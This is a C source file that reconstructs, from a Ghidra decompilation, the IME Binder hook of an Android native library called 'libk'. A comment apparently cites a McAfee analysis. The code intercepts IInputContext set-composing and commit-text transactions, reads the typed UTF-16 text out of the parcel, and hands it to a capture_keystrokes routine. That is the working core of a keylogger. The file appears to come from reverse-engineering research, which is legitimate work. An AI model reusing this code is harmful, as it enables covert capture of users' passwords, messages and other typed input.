/*
 * libk IME Binder hook callback
 * Ghidra: FUN_00015618 @ 0x15618 (called from transact wrapper FUN_0001494c)
 * McAfee: hooks IPCThreadState::transact, codes 6/8, IInputContext parcel
 */

#include "strings.h"
#include "parcel_wire.h"

#include <stdint.h>
#include <string.h>
#include <android/log.h>

#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LIBK_LOG_TAG, __VA_ARGS__)

extern void capture_keystrokes(int char16_len, const uint16_t *utf16_buf);

void ime_binder_hook_callback(int transaction_code, void *parcel /* android::Parcel * */)
{
    parcel_view_t pv;
    int32_t field_a;
    int32_t field_b;
    const uint16_t *text;
    size_t text_len;

    if (transaction_code != LIBK_TX_SET_COMPOSING &&
        transaction_code != LIBK_TX_COMMIT_TEXT) {
        return;
    }

    if (!parcel)
        return;

    pv = parcel_view_from_binder_parcel(parcel);
    if (!pv.data)
        return;

    /* Ghidra: setDataPosition(0); enforceInterface(IInputContext) */
    pv.pos = 0;
    if (parcel_enforce_interface(&pv, LIBK_INPUT_INTERFACE) != 0)
        return;

    LOGI("IME transact code %d (%s)", transaction_code, LIBK_INPUT_INTERFACE);

    /*
     * Ghidra @ 0x15678–0x15692:
     *   readInt32(); readInt32(); dataPosition(); readString16(); FUN_0001551c
     */
    if (parcel_read_int32(&pv, &field_a) != 0)
        return;
    if (parcel_read_int32(&pv, &field_b) != 0)
        return;

    LOGI("parcel fields a=%d b=%d pos=%u", field_a, field_b, (unsigned)pv.pos);

    if (parcel_read_string16(&pv, &text, &text_len) != 0)
        return;

    if (text_len == 0)
        return;

    capture_keystrokes((int)text_len, text);
}
